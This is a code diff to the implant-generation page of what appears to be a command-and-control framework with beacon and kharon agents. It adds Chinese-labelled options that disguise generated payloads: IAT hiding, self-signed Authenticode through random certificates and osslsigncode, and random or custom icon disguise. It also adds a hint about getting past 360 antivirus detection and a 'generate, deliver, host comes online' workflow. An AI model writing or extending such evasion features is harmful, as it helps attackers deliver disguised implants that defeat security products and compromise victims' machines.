@@ -80,10 +80,17 @@ export function Generate() {
   const [sleep, setSleep] = useState(profile.defaultSleep || '5s')
   const [jitter, setJitter] = useState(0)
   const [listener, setListener] = useState('')
+  const [iatHiding, setIatHiding] = useState(true)
+  const [iconRandom, setIconRandom] = useState(true)
+  const [iconFile, setIconFile] = useState<File | null>(null)
+  const [exePseudoSign, setExePseudoSign] = useState(true)
   const [busy, setBusy] = useState(false)
   const [result, setResult] = useState('')
   const [lastFile, setLastFile] = useState('')
   const [lastSize, setLastSize] = useState(0)
+
+  const peFormat = format === 'Exe' || format === 'Service Exe' || format === 'DLL'
+  const exeFormat = format === 'Exe' || format === 'Service Exe'
 
   const agentChoices = useMemo(
     () => AGENT_PROFILES.filter((p) => preset.agents.includes(p.agent)),
@@ -164,12 +171,18 @@ export function Generate() {
     try {
       let cfg = defaultAgentConfig(agent, format, arch, os)
       if (agent === 'beacon') {
+        let iconContent = ''
+        if (peFormat && !iconRandom && iconFile) {
+          iconContent = await fileToBase64(iconFile)
+        }
         cfg = {
           ...cfg,
           sleep,
           jitter,
-          iat_hiding: false,
-          exe_pseudo_sign: format === 'Exe' || format === 'Service Exe',
+          iat_hiding: iatHiding,
+          icon_random: peFormat && iconRandom,
+          icon_content: iconContent,
+          exe_pseudo_sign: exeFormat && exePseudoSign,
         }
       } else if (agent === 'kharon') {
         cfg = { ...cfg, sleep, jitter }
@@ -376,6 +389,47 @@ export function Generate() {
                   </div>
                 </div>
               )}
+
+              {agent === 'beacon' && (
+                <div className="field">
+                  <label>伪装 / IAT</label>
+                  <div className="gen-opt-list">
+                    <label className="check-inline">
+                      <input type="checkbox" checked={iatHiding} onChange={(e) => setIatHiding(e.target.checked)} />
+                      IAT Hiding（空导入表 / no CRT）
+                    </label>
+                    {exeFormat && (
+                      <label className="check-inline">
+                        <input type="checkbox" checked={exePseudoSign} onChange={(e) => setExePseudoSign(e.target.checked)} />
+                        自签名 Authenticode（随机证书 + osslsigncode）
+                      </label>
+                    )}
+                    {peFormat && (
+                      <>
+                        <label className="check-inline">
+                          <input type="checkbox" checked={iconRandom} onChange={(e) => {
+                            setIconRandom(e.target.checked)
+                            if (e.target.checked) setIconFile(null)
+                          }} />
+                          随机 ICO 图标伪装
+                        </label>
+                        {!iconRandom && (
+                          <div className="field-inline">
+                            <input
+                              type="file"
+                              accept=".ico,image/x-icon,image/vnd.microsoft.icon"
+                              onChange={(e) => setIconFile(e.target.files?.[0] || null)}
+                            />
+                            <span className="dim" style={{ fontSize: 11.5 }}>
+                              {iconFile ? iconFile.name : '可选：自定义 .ico'}
+                            </span>
+                          </div>
+                        )}
+                      </>
+                    )}
+                  </div>
+                </div>
+              )}
             </div>
 
             {format === 'Stager' && (
@@ -387,7 +441,7 @@ export function Generate() {
             )}
             {agent === 'beacon' && format !== 'Stager' && (
               <div className="hint muted-hint">
-                生产建议：gcc + 关闭 iat_hiding。反复扫描同模式会触发云学习；单次投递优先 <b>Stager</b>。
+                对齐官方 GenerateUI：IAT Hiding 默认开；360 QVM 扫同模式可关掉。Exe 默认证自签名 + 随机图标。
               </div>
             )}
             {agent === 'kharon' && (
@@ -477,6 +531,26 @@ export function Generate() {
                   </b>
                 </div>
               )}
+              {agent === 'beacon' && (
+                <>
+                  <div>
+                    <span className="k">IAT</span>
+                    <b>{iatHiding ? 'hiding' : 'off'}</b>
+                  </div>
+                  {exeFormat && (
+                    <div>
+                      <span className="k">签名</span>
+                      <b>{exePseudoSign ? '自签名' : '无'}</b>
+                    </div>
+                  )}
+                  {peFormat && (
+                    <div>
+                      <span className="k">图标</span>
+                      <b>{iconRandom ? '随机 ICO' : (iconFile ? iconFile.name : '默认')}</b>
+                    </div>
+                  )}
+                </>
+              )}
             </div>
             <div className="hint muted-hint" style={{ marginTop: 14 }}>
               流程：创建监听 → 选平台 → 选格式 → 生成 → 投递 → 主机上线。
@@ -504,6 +578,19 @@ export function Generate() {
       </div>
     </div>
   )
+}
+
+function fileToBase64(file: File): Promise<string> {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader()
+    reader.onload = () => {
+      const s = String(reader.result || '')
+      const i = s.indexOf(',')
+      resolve(i >= 0 ? s.slice(i + 1) : s)
+    }
+    reader.onerror = () => reject(reader.error || new Error('read icon failed'))
+    reader.readAsDataURL(file)
+  })
 }
 
 /** 芯片上显示更短的标签，完整名在 title */
